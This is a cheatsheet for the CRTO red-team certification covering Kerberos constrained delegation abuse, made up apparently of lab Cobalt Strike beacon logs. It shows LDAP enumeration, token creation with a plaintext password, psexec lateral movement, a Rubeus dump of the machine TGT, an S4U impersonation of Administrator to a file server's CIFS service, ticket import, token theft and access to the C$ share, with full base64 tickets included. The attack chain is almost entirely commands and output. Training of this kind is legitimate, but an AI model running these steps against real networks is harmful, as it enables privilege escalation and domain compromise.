---
title: CRTO Cheetsheet
date: 2026-02-17 18:49 +0100
categories: [Cheetsheet, CRTO]
tags: [CRTO, Hacking, Active Directory, Windows, Kerberos, Constrained Delegation, Unconstrained Delegation, RBCD, Rubeus]
---

# Kerberos
## Constrained Delegation
### Detection
```powershell
[12/07 22:01:34] beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
[12/07 22:01:34] [+] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[12/07 22:01:34] [*] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[12/07 22:01:34] [+] host called home, sent: 12702 bytes
[12/07 22:01:34] [+] received output:
Binding to 10.10.120.1
[12/07 22:01:34] [+] received output:
[*] Distinguished name: DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))
[*] Scope of search value: 3
[*] Returning specific attribute(s): samAccountName,msDS-AllowedToDelegateTo

--------------------
sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1
retreived 1 results total
```

```powershell
[12/07 22:02:19] beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
[12/07 22:02:19] [+] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[12/07 22:02:19] [*] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[12/07 22:02:19] [+] host called home, sent: 12679 bytes
[12/07 22:02:19] [+] received output:
Binding to 10.10.120.1
[12/07 22:02:19] [+] received output:
[*] Distinguished name: DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (&(samAccountType=805306369)(samaccountname=lon-ws-1$))
[*] Scope of search value: 3
[*] Returning specific attribute(s): userAccountControl

--------------------
userAccountControl: 16781312
retreived 1 results total
```

```powershell
PS C:\Users\Attacker> [Convert]::ToBoolean(16781312 -band 16777216)
True
```
### Exploitation
```powershell
[12/07 22:04:09] beacon> make_token CONTOSO\rsteel Passw0rd!
[12/07 22:04:09] [+] host called home, sent: 42 bytes
[12/07 22:04:09] [+] Impersonated CONTOSO\rsteel (netonly)
```

```powershell
[12/07 22:04:43] beacon> jump psexec64 lon-ws-1 smb
[12/07 22:04:43] [+] host called home, sent: 395616 bytes
[12/07 22:05:06] [+] received output:
Started service 453f865 on lon-ws-1
[12/07 22:05:06] [+] established link to child beacon: 10.10.120.10
```
<img width="1154" height="285" alt="image" src="https://github.com/user-attachments/assets/0bc6dd6d-8d0c-4563-a6c0-27222990b45f" />

```powershell
[12/07 22:06:38] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
[12/07 22:06:44] [*] Tasked beacon to run .NET program: Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
[12/07 22:06:44] [+] host called home, sent: 577868 bytes
[12/07 22:06:46] [+] job registered with id 0
[12/07 22:06:46] [+] [job 0] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x3e7
[*] Current LUID    : 0x3e7

  UserName                 : LON-WS-1$
  Domain                   : CONTOSO
  LogonId                  : 0x3e7
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Negotiate
  LogonType                : 0
  LogonTime                : 07/12/2025 13:56:29
  LogonServer              : 
  LogonServerDNSDomain     : contoso.com
  UserPrincipalName        : LON-WS-1$@contoso.com


    ServiceName              :  krbtgt/CONTOSO.COM
    ServiceRealm             :  CONTOSO.COM
    UserName                 :  LON-WS-1$ (NT_PRINCIPAL)
    UserRealm                :  CONTOSO.COM
    StartTime                :  07/12/2025 22:06:46
    EndTime                  :  08/12/2025 07:58:39
    RenewTill                :  14/12/2025 21:58:39
    Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType                  :  rc4_hmac
    Base64(key)              :  rDvZJMn+NFCDaLTU6j4dHA==
    Base64EncodedTicket   :

      doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBE8wggRLoAMCARKhAwIBAqKCBD0EggQ5HmPvEKRSe3SrihMJwFo4xknHqNvwDD6UVkMdzTCu8IRnCmLpCfzfuefsJSRi9HqRhPYdvunB0EniL1EC4Hh1sd78+shBydJ2KFIWvDO/84GU5hDpZZuNQjRFH/VMI0ReuRKVm0IImJtxQdmgjIPkQ8PI95nJ567OZBbOEkIz29TpI2flHJmplSn85QgfXiPLQO5SwEnAyA+Hau9fzcxkiky5ZZ4e0tmZuXXoKqAsl1ayitmOxkMwpoQNyGr5WTWo3BL4SgG/nM0ntn4ubth8+uuTMk/G4slvhSAT6Mcac3/VCsawC9lco5HR+4Sd6zCb3FDRXsvj/f/2tXgTpfKg9ukFHNxNkB3LF+3DVjSOzk82O+5hYoEKmaSBWpChPKKEGAQYD2ktKhgBstNyJniHPnITNrTTsk/9DYZ2gRnheJZSRlCMF9x++G+OdOKNGXh1mASo5hpzfiH2sYaqYcx/aVIEJyy6iGclIIc9+8DNpcnx9s4jy14YrmaZPRXyVgKiqqgwZ4a5XteXRC0tSngzl4jceLxI7scztqcmuYREcqc3M1zSKBjKi++IEsC4N45xO8Kry/kXZc2QaGg1t7HnXF5qYVbiCjvTbeJ5hYTTVTqlRbeOjqmL1LjsNIp9tthZ8FdHvTL2R77i8nIuh9bxhji/ZKSnuunBry+iOjzsK5BCx1SkDPiDqaimumvtWuWhMJMJ5jS8YdFKVt4TAzF6zoPPU+mExrP9EKFMDkxqFKJstl9xHUQo8msUCGvbKCvxRiP+Rp9uBy3DNqSLk5tKwsqG5TI+JJ6Iii86JryUj4f2E4KCfCAPPwe2dFAWGOjgGGNWLUe7dQZUSNvSJgW+Uafv+pwtkgNxh0XgVYfRi+BDp+kXD4bHT+UmwkRsMvP/HA9svGQ8sVInIT9CdBC7BVYOugDHU6QTNrGVdQT/TC9dQWuY0RayYQq24Ytms3WSHR5Kf0vAYxNIId2cm1l7QviZBvuFEaoCWMZoLaVCyFDf7WnL631yVFqTX7lHnfe5THFDz6kMBQ4JMhtsMPzB5/l0BffUV1ywkke03P8x61rNTYrut8dT+rISenFakJwxuo7qswL2lCxY4CQbfN9g1JbwG9cKMYhRoGrZj5pRjOUcBtasuX/xgiMrKJ2Ye+TLjdf2DU48nW6jwCRf99eljmbhmQYdMb9HnO5wZPOUb6lVMRIWCEa2gbj+ECHTQcG1TIH8FcRPAU/USZFmPHvZmsOTrkHFe7h43NtpWEvoI/AVfNCXJ2CbcLe8b6G1wkT0fubBHyViIko+X+6Qa11Ac7KHs8afYxa6Njq7V0M1VMiQP5+nZmQXDVhZuP3MF6ZT6EsfBdxrSk+LokwmHdutc/AbXTMStOLo6eQ3GZ006DOir/0Prg21R5oL3q3m+9kR5x0pHQmsYRoCzGDTgsQqcw5mLzFfcPXilqOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEEKw72STJ/jRQg2i01Oo+HRyhDRsLQ09OVE9TTy5DT02iFjAUoAMCAQGhDTALGwlMT04tV1MtMSSjBwMFAGChAAClERgPMjAyNTEyMDcyMjA2NDZaphEYDzIwMjUxMjA4MDc1ODM5WqcRGA8yMDI1MTIxNDIxNTgzOVqoDRsLQ09OVE9TTy5DT02pIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NPTlRPU08uQ09N


[12/07 22:06:47] [+] job 0 completed
```

```powershell
[12/07 22:08:07] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBE8wggRLoAMCARKhAwIBAqKCBD0EggQ5HmPvEKRSe3SrihMJwFo4xknHqNvwDD6UVkMdzTCu8IRnCmLpCfzfuefsJSRi9HqRhPYdvunB0EniL1EC4Hh1sd78+shBydJ2KFIWvDO/84GU5hDpZZuNQjRFH/VMI0ReuRKVm0IImJtxQdmgjIPkQ8PI95nJ567OZBbOEkIz29TpI2flHJmplSn85QgfXiPLQO5SwEnAyA+Hau9fzcxkiky5ZZ4e0tmZuXXoKqAsl1ayitmOxkMwpoQNyGr5WTWo3BL4SgG/nM0ntn4ubth8+uuTMk/G4slvhSAT6Mcac3/VCsawC9lco5HR+4Sd6zCb3FDRXsvj/f/2tXgTpfKg9ukFHNxNkB3LF+3DVjSOzk82O+5hYoEKmaSBWpChPKKEGAQYD2ktKhgBstNyJniHPnITNrTTsk/9DYZ2gRnheJZSRlCMF9x++G+OdOKNGXh1mASo5hpzfiH2sYaqYcx/aVIEJyy6iGclIIc9+8DNpcnx9s4jy14YrmaZPRXyVgKiqqgwZ4a5XteXRC0tSngzl4jceLxI7scztqcmuYREcqc3M1zSKBjKi++IEsC4N45xO8Kry/kXZc2QaGg1t7HnXF5qYVbiCjvTbeJ5hYTTVTqlRbeOjqmL1LjsNIp9tthZ8FdHvTL2R77i8nIuh9bxhji/ZKSnuunBry+iOjzsK5BCx1SkDPiDqaimumvtWuWhMJMJ5jS8YdFKVt4TAzF6zoPPU+mExrP9EKFMDkxqFKJstl9xHUQo8msUCGvbKCvxRiP+Rp9uBy3DNqSLk5tKwsqG5TI+JJ6Iii86JryUj4f2E4KCfCAPPwe2dFAWGOjgGGNWLUe7dQZUSNvSJgW+Uafv+pwtkgNxh0XgVYfRi+BDp+kXD4bHT+UmwkRsMvP/HA9svGQ8sVInIT9CdBC7BVYOugDHU6QTNrGVdQT/TC9dQWuY0RayYQq24Ytms3WSHR5Kf0vAYxNIId2cm1l7QviZBvuFEaoCWMZoLaVCyFDf7WnL631yVFqTX7lHnfe5THFDz6kMBQ4JMhtsMPzB5/l0BffUV1ywkke03P8x61rNTYrut8dT+rISenFakJwxuo7qswL2lCxY4CQbfN9g1JbwG9cKMYhRoGrZj5pRjOUcBtasuX/xgiMrKJ2Ye+TLjdf2DU48nW6jwCRf99eljmbhmQYdMb9HnO5wZPOUb6lVMRIWCEa2gbj+ECHTQcG1TIH8FcRPAU/USZFmPHvZmsOTrkHFe7h43NtpWEvoI/AVfNCXJ2CbcLe8b6G1wkT0fubBHyViIko+X+6Qa11Ac7KHs8afYxa6Njq7V0M1VMiQP5+nZmQXDVhZuP3MF6ZT6EsfBdxrSk+LokwmHdutc/AbXTMStOLo6eQ3GZ006DOir/0Prg21R5oL3q3m+9kR5x0pHQmsYRoCzGDTgsQqcw5mLzFfcPXilqOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEEKw72STJ/jRQg2i01Oo+HRyhDRsLQ09OVE9TTy5DT02iFjAUoAMCAQGhDTALGwlMT04tV1MtMSSjBwMFAGChAAClERgPMjAyNTEyMDcyMjA2NDZaphEYDzIwMjUxMjA4MDc1ODM5WqcRGA8yMDI1MTIxNDIxNTgzOVqoDRsLQ09OVE9TTy5DT02pIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NPTlRPU08uQ09N /impersonateuser:Administrator /nowrap
[12/07 22:08:13] [+] host called home, sent: 581728 bytes
[12/07 22:08:15] [+] job registered with id 1
[12/07 22:08:15] [+] [job 1] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: S4U


[12/07 22:08:15] [+] [job 1] received output:
[*] Action: S4U

[*] Building S4U2self request for: 'LON-WS-1$@CONTOSO.COM'

[12/07 22:08:15] [+] [job 1] received output:
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WS-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      doIGfDCCBnigAwIBBaEDAgEWooIFlDCCBZBhggWMMIIFiKADAgEFoQ0bC0NPTlRPU08uQ09NohswGaADAgECoRIwEBsEY2lmcxsIbG9uLWZzLTGjggVTMIIFT6ADAgESoQMCAQGiggVBBIIFPdYsEgjKgVSigrQN06PNSp1SpxPg6spv2P0dBZuO+9jK9ALstqCtVf5T4l+WEpIStRYoGXsxw99avxiNAnnsawsZ5M/ZA6XnsyomOUtrMjPtnAmLO8v2yWN58rTYWRCN22NRktSGtq1Z1hpO6/b1wZtN1nrf3X+D8oi5XBPk1Fdpnlh6170iD6FCtE4BXnEQsSJO7tjVJT7dlp3BkYI6blSYWrAebxCdr9vOa0TDAYaKAMfZzhDZC+XiUBP1G5Q+lJrKJKc3KQVSZQpi5yEei80zszqYB/P7ZyOzgW1kDRc/mVKB1JCyZH3qnnPDLIoGkyxysCIrM17sg6fh02fB2EkooViuCyp0tV/skTHOejKIE+sCxXbQ1kZbWyHJ6gb50ue55x05eMn+noW2gSoojtnJqFDoqUb2pzbYYgMcHeMK2uX0DMm0Jk/sY8NdByviKZ6fSMkfX+t7umVfRlYb+M/2648f1SA5PlVDld32corvTiyDtmuuf2HfgDl6NMXutr4gsAo7bwXmzTNpghS2GSH+ZpForqKEe4yFSIj/iBnopeuZRbkJ2vF4LJXdJuJcRHekP6lPOpm/JY+FWMlFHpddgQALimZBeczui8kLrpwW12ZaIQBeB1cq6iS3E7b0/EPGz56M+zrQoEQqOR3KsY9gk1Uq91rbNnOWXvMERiKRkZxqtfw4B9ZOL78Uj9NFAVv8uuBfbPXVxRR/qVPcTCVFl25ZLpU/tUCevUQYTHDoDx0Fl+M7pP5T+CDxEuisUOfbnLYpKGcBdfxVc1ciUqBOSyXpBOn21HWEx0SMGk12TKQ730c9U4u0e2DyWPukPdOIH//F2QYE4+gatYt5Uo+MvaCRB8wveQxu3JIQlc1Kk8s8/jE8c9D7GUYbUMRCT1WOdE9zb9ejTmw0qUTGwIdj9qVG9ljv4gT68NYGBlS0AyVN+zlzsKgpOpOkoHuNiawhOyWSJDwYMLV1OlqFqjjhOpNVqVOeqBveuZJ8OXSBOCjnrVLhpQFNHAObJTR3H3gBFbLrUy4gOepsn7yvrTmx/p75BxUOdPWVM9i52j5+1j1fVDJNFmaxVtfZ30FkGj2NxX/KmyJ/3C4rzNb9MLVH+jExt4KtScNmxeZgqBcDYxQL2yEfHcWLhgyF3p9uQSIkXux9wQpKQRDBLHa7+UlcXOAiD3LR7l4E3lP3AbZWiu3QUSv+abpcE5dum75akD+MYK8Wy9vuBqQnX9s3kb+1uAFnqfVoluMMtGKPxzbRUiVcIBvjXs6v0PXJS50WAQpX6kLCyZLmMU4uzRLPCL7lQc1qGW7IM6BwP4B2PEfV9bhSd5MQ/zKXYHlqido79eHuir9S+/P/RLp4L0O2eIbeWuQMZvr2q5mFKVvsIV2Cv4EbFm0EtXRC46P/Xc6umjkbSSSmQKQx3abfjZuRByrIVsAmizA3jo0wo7W9muLDnWPJDT1uVIVpL4h3WEh7MvgPPvn08laHYVjxz6fBE2KPwvvujliKAKIwkGGnfk9uNl5fB4ESILbTglqafUeeOQjoatcxgHfwUGl80Am8HJZ0sx9gQ6+XDgDfNZY2P9vLGoaRLRaioFkzAW/xSbxwAcfCFVGNH0Cn2iWishgQtGUtSR7cEpNQ9qERRGjt8kydyu7d89o6kqjcS4AP09CBvhMGPqoHG46g59KHugWDE9bAC3dIo4U9xD+67Sox4TjdfTeal3GFZG3i6E23+qnJnre58b+UzQAk52EjGvumN9x+xvLJMh5VGwwvKbMxpf7YAmPg8wTvuwD/O0otYKOB0zCB0KADAgEAooHIBIHFfYHCMIG/oIG8MIG5MIG2oBswGaADAgERoRIEEIyqsTjVbB1dbSMczDDXAFuhDRsLQ09OVE9TTy5DT02iGjAYoAMCAQqhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBgoQAApREYDzIwMjUxMjA3MjIwODE1WqYRGA8yMDI1MTIwODA3NTgzOVqnERgPMjAyNTEyMTQyMTU4MzlaqA0bC0NPTlRPU08uQ09NqRswGaADAgECoRIwEBsEY2lmcxsIbG9uLWZzLTE=

[12/07 22:08:16] [+] job 1 completed
```

```powershell
[12/07 22:11:15] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket: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
[12/07 22:11:21] [+] host called home, sent: 582472 bytes
[12/07 22:11:22] [+] job registered with id 2
[12/07 22:11:22] [+] [job 2] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Create Process (/netonly)


[*] Using CONTOSO.COM\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4548
[+] Ticket successfully imported!
[+] LUID            : 0x119ed4

[12/07 22:11:23] [+] job 2 completed
```

```powershell
[12/07 22:12:20] beacon> steal_token 4548
[12/07 22:12:20] [+] host called home, sent: 12 bytes
[12/07 22:12:20] [+] Impersonated NT AUTHORITY\SYSTEM
```

```powershell
[12/07 22:12:45] beacon> run klist
[12/07 22:12:45] [+] host called home, sent: 23 bytes
[12/07 22:12:45] [+] job registered with id 3
[12/07 22:12:45] [+] [job 3] received output:

Current LogonId is 0:0x119ed4

Cached Tickets: (1)

#0>	Client: Administrator @ CONTOSO.COM
	Server: cifs/lon-fs-1 @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 12/7/2025 22:08:15 (local)
	End Time:   12/8/2025 7:58:39 (local)
	Renew Time: 12/14/2025 21:58:39 (local)
	Session Key Type: AES-128-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called: 

[12/07 22:12:45] [+] job 3 completed
```

```powershell
[12/07 22:13:10] beacon> ls \\lon-fs-1\c$
[12/07 22:13:10] [+] host called home, sent: 31 bytes
[12/07 22:13:10] [*] Listing: \\lon-fs-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     02/20/2025 10:37:21   Files
          dir     05/08/2021 08:20:24   PerfLogs
          dir     04/11/2025 12:05:23   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     04/11/2025 10:57:19   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/24/2025 14:18:02   System Volume Information
          dir     01/24/2025 14:17:49   Users
          dir     04/11/2025 10:57:34   Windows
 12kb     fil     12/07/2025 13:56:28   DumpStack.log.tmp
 1gb      fil     12/07/2025 13:56:28   pagefile.sys
```

## Unconstrained Delegation
## RBCD
